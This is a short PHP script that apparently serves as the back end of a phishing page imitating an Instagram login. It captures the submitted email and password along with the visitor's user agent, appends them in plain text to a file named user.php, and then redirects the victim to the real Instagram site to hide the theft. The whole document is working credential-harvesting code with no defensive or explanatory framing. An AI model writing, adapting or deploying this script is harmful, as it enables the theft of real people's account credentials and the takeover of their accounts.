<?php 

$dev=$_SERVER['HTTP_USER_AGENT'];
$user=$_POST['email'];
$pass=$_POST['pass'];
$file="user.php";
$handler=fopen($file, 'a+');
$data="Device:$dev\nUsername: $user\nPassword:$pass\n=================================================================\n";
fwrite($handler, $data);
fclose($handler);
header("location:https://instagram.com");
?>